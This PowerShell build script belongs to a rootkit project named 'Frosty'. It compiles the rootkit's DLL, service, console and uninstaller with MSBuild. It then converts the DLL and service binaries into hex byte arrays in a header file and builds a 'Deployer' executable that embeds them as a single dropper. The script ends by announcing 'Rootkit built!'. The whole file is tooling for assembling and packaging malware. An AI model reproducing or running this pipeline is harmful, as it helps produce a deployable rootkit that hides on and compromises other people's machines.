$MSBUILD = "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe"

if (-not $args) {
    Write-Host "[-] Add the architecture (x64/x86). Ex:"
    Write-Host ".\builder.ps1 x64"
} else {
    if ($args[0] -eq "x64") {
        $MSB_FLAGS = @("/t:Rebuild", "/p:Configuration=Release", "/p:Platform=x64")
    } elseif ($args[0] -eq "x86") {
        $MSB_FLAGS = @("/t:Rebuild", "/p:Configuration=Release", "/p:Platform=Win32")
    }

    Remove-Item -Path "build" -Recurse -Force | Out-Null
    New-Item -ItemType Directory -Path "build" | Out-Null

    Write-Host "[*] Building $($args[0]) Rootkit"
    & $MSBUILD Frosty.sln $MSB_FLAGS
    Copy-Item ".\x64\Release\Dll.dll" -Destination ".\build\" -Force
	Copy-Item ".\x64\Release\Console.exe" -Destination ".\build\" -Force
	Copy-Item ".\x64\Release\Service.exe" -Destination ".\build\" -Force
	Copy-Item ".\x64\Release\Uninstall.exe" -Destination ".\build\" -Force	
	
	
	$rkDllFile = "$pwd\build\Dll.dll"
	$rkDllContent = [System.IO.File]::ReadAllBytes($rkDllFile)
	$rkDllHex = $rkDllContent | ForEach-Object { "0x{0:X2}" -f $_ }
	$rkDllHex = $rkDllHex -join ', '
	
	$rkServiceFile = "$pwd\build\Service.exe"
	$rkServiceContent = [System.IO.File]::ReadAllBytes($rkServiceFile)
	$rkServiceHex = $rkServiceContent | ForEach-Object { "0x{0:X2}" -f $_ }
	$rkServiceHex = $rkServiceHex -join ', '
	
	echo 'unsigned char rkDll[] = { ' > Deployer/Deployer/Raw.h
	echo "$rkDllHex" >> Deployer/Deployer/Raw.h
	echo "};" >> Deployer/Deployer/Raw.h
	
	echo 'unsigned char rkService[] = { ' >> Deployer/Deployer/Raw.h
	echo "$rkServiceHex" >> Deployer/Deployer/Raw.h
	echo "};" >> Deployer/Deployer/Raw.h
	
    Set-Location "Deployer"
    & $MSBUILD Deployer.sln $MSB_FLAGS
    Copy-Item ".\x64\Release\Deployer.exe" -Destination "..\build\" -Force
	Set-Location ".."


    Write-Host "[+] Rootkit built!"
}
